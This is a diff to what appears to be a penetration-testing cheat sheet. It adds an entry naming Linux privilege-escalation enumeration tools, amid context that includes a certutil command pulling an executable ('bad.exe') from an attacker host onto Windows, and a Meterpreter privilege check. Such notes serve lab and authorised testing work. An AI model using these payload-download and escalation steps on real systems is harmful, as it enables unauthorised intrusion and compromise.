@@ -95,6 +95,10 @@ Payloads other than msf:
 Download file to windows:
 `certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
 
+Escalate user:
+* `linEnum`
+* `LinuxPrivChecker`
+
 ## Meterpreter etc
 `meterpreter > getuid`
 * NT AUTHORITY\SYSTEM - highest user on windows
